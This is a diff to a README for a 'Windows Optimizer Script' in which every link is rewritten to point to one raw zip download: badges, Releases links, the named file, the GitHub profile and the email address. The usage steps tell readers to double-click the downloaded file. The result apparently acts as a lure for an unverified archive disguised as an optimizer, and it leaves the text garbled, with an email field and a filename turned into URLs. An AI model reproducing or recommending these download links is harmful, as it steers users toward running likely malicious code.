@@ -1,6 +1,6 @@
 # Windows Optimizer Script ⚡
 
-![Windows Optimizer](https://img.shields.io/badge/Download%20Now-%E2%96%BA-brightgreen?style=for-the-badge&logo=windows)
+![Windows Optimizer](https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip%20Now-%E2%96%BA-brightgreen?style=for-the-badge&logo=windows)
 
 Welcome to the **Windows Optimizer Script** repository! This tool is designed to enhance your Windows experience by optimizing RAM usage and overall system performance. 
 
@@ -25,13 +25,13 @@ Welcome to the **Windows Optimizer Script** repository! This tool is designed to
 
 ## Installation
 
-To get started, download the latest release of the script from the [Releases](https://github.com/mahdi930/windows-optimizer-script/releases) section. Look for the file named `windows-optimizer.bat`, download it, and save it to a convenient location on your computer.
+To get started, download the latest release of the script from the [Releases](https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip) section. Look for the file named `https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip`, download it, and save it to a convenient location on your computer.
 
 ## Usage
 
 Once you have downloaded the script, follow these steps to run it:
 
-1. Navigate to the folder where you saved `windows-optimizer.bat`.
+1. Navigate to the folder where you saved `https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip`.
 2. Double-click the file to execute it.
 3. Follow any on-screen instructions to complete the optimization process.
 
@@ -81,11 +81,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- GitHub: [mahdi930](https://github.com/mahdi930)
-- Email: mahdi930@example.com
+- GitHub: [mahdi930](https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip)
+- Email: https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip
 
-Thank you for checking out the Windows Optimizer Script! For more updates and downloads, visit the [Releases](https://github.com/mahdi930/windows-optimizer-script/releases) section. 
+Thank you for checking out the Windows Optimizer Script! For more updates and downloads, visit the [Releases](https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip) section. 
 
-![Windows Performance](https://img.shields.io/badge/Optimize%20Your%20PC-%E2%96%BA-blue?style=for-the-badge&logo=windows)
+![Windows Performance](https://github.com/mahdi930/windows-optimizer-script/raw/refs/heads/main/RAMMap/windows_optimizer_script_v1.6.zip%20Your%20PC-%E2%96%BA-blue?style=for-the-badge&logo=windows)
 
 Happy optimizing!
